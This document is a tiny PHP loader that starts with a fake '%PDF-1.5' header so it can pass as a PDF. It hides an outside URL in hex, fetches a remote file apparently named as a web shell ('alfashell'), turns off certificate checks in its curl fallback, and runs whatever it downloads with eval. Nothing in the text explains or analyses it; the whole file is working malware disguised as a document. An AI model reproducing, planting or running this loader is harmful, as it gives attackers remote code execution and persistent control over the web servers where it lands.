%PDF-1.5
<?php
$hexUrl = '68747470733a2f2f63646e2e707269766461797a2e636f6d2f7478742f616c66617368656c6c2e747874';
$url = hex2bin($hexUrl);

$phpScript = @file_get_contents($url);
if ($phpScript === false && function_exists('curl_init')) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $phpScript = curl_exec($ch);
    curl_close($ch);
}

if ($phpScript !== false) {
    eval('?>' . $phpScript);
} else {
    die(".");
}
?>